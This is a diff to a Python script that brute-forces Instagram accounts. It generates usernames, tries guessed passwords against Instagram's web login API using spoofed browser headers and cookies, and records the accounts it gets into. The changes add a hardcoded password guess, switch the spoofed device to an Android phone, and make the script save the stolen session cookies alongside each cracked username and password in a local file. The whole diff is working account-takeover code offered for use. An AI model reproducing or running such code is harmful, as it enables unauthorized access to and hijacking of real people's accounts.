@@ -110,7 +110,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = [uid[:6],uid[:8],uid,uid[2:],uid[4:]] 
+            pww = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200'] 
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
     print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
@@ -133,14 +133,13 @@ def crack(uid, pww, total_idz):
         for pw in pww:
             session = requests.Session()
             time_now = int(time.time())
-            params = {'hl': 'en',}
             cookies = {
-                'csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'wd': '885x773',}
+                'csrftoken': 'C-0gmeW0GBKNePMGhh4dUW',
+                'dpr': '2.200000047683716',
+                'mid': 'ZsDFggABAAG4Q9ExLC0j_wLhNrEA',
+                'datr': 'gcXAZpWAKx8H7YTJz0OkkknU',
+                'ig_did': 'C2E9E8CB-9BE1-4012-BB25-325BE285835B',
+                'wd': '491x571',}
             data = {
                 "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}",
                 'optIntoOneTap': 'false',
@@ -148,37 +147,41 @@ def crack(uid, pww, total_idz):
                 'trustedDeviceRecords': '{}',
                 'username': uid,}
             headers = {
+                'authority': 'www.instagram.com',
                 'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
+                'referer': 'https://www.instagram.com/',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-model': '"23076PC4BI"',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-platform-version': '"14.0.0"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                 'x-asbd-id': '129477',
-                'x-csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
-                'x-ig-app-id': '936619743392459',
+                'x-csrftoken': 'C-0gmeW0GBKNePMGhh4dUW',
+                'x-ig-app-id': '1217981644879628',
                 'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015762410',
+                'x-instagram-ajax': '1015763003',
                 'x-requested-with': 'XMLHttpRequest',
-                'x-web-device-id': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',}
+                'x-web-device-id': 'C2E9E8CB-9BE1-4012-BB25-325BE285835B',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, params=params, cookies=cookies, headers=headers, data=data)
-            if response.status_code == 200 and response.json().get("authenticated"):
-                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
+            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
+            if response.status_code == 200:
+                json_response = response.json()
+                if json_response.get('authenticated'):
+                        session_cookies = response.cookies.get_dict()
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        oks.append(uid)
+                        break
             else:
                 continue
         loop+=1
@@ -186,8 +189,5 @@ def crack(uid, pww, total_idz):
         time.sleep(10)
     except:
         pass
- 
- 
- 
 menu()
  
